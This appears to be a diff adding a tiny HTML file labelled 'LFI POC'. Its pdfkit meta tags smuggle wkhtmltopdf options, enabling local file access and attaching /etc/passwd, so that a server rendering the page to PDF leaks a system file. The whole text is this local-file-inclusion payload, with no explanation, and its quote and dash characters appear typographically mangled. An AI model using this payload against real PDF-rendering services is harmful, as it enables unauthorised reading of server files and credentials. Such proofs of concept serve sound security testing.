@@ -1,0 +1,5 @@
+<meta name=’pdfkit—quiet’ content=”>
+<meta name=’pdfkit—enable-local-file-access’ content=”>
+<meta name=’pdfkit—post-file’ content=”>
+<meta name=’pdfkit-file–a’ content=’/etc/passwd’>
+<h1>LFI POC</h1>
